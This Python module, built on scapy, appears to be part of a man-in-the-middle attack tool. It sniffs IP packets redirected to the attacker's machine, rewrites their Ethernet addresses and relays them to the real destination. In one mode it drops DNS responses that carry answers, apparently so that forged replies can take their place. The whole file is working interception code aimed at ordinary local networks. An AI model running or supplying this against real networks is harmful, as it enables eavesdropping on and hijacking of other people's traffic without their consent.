# Standard libraries
from threading import Lock

# Additional libraries
from scapy import packet
from scapy.arch import get_if_hwaddr, get_if_addr
from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

# Local libraries
from src.tools import get_mac_by_ip


def forward(interface: str, settings: dict):
    print('Forwarding intercepted packets on ' + interface)
    hosts_dictionary: dict = settings['hosts'][interface]
    lock: Lock = settings['locks'][interface]
    attacker_mac = get_if_hwaddr(interface)
    attacker_ip = get_if_addr(interface)

    def send_forward(received_packet: packet):
        src_mac = received_packet[Ether].src
        received_packet[Ether].src = attacker_mac
        lock.acquire()
        dst_mac = get_mac_by_ip(received_packet[IP].dst, hosts_dictionary)
        received_packet[Ether].dst = dst_mac
        lock.release()
        if settings['show debug']:
            received_packet.show()
        try:
            sendp(received_packet, iface=interface, verbose=settings['show debug'])
        except Exception:
            print('Could not forward a package from ' + src_mac + ' to ' + dst_mac)

    def ip_callback(received_packet: packet):
        if received_packet[Ether].dst != attacker_mac:
            return
        if received_packet[IP].dst == attacker_ip:
            return
        print('received intercepted package')
        if settings['forward'] == 'all-except':
            if DNS in received_packet:
                if received_packet[DNS].qr == 1 and received_packet[DNS].ancount > 0:
                    if settings['show selective forward block']:
                        print('Did not forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[
                            IP].dst)
                    return
        send_forward(received_packet)

    while not settings['interrupted']:
        sniff(iface=interface, prn=ip_callback, filter='ip', store=0, timeout=1)